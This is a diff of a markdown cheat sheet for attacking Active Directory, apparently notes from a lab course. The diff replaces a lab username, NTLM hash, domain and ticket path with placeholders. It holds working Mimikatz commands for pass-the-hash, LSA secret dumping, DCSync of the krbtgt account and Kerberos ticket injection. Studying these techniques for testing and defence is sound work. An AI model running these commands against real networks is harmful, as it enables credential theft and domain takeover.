@@ -165,7 +165,7 @@ Invoke-ACLScanner -ResolveGUIDs
 
 **Make ntlm ps-session:-**
 
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<Domain name> /ntlm:<ntlm hash for user> /run:powershell.exe"'
 
 
 
@@ -175,7 +175,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.money
 
 Invoke-Mimikatz -Command ‘“lsadump::lsa /patch”’
 
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<user>\krbtgt"'
 
 (dcsync requires 3 permission )`
 
@@ -184,7 +184,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
 **Inject ticket:-**
 
-`Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'`
+`Invoke-Mimikatz -Command '"kerberos::ptt <location of .kirbi tkt>"'`
 
 **Export Tickets:-**
 
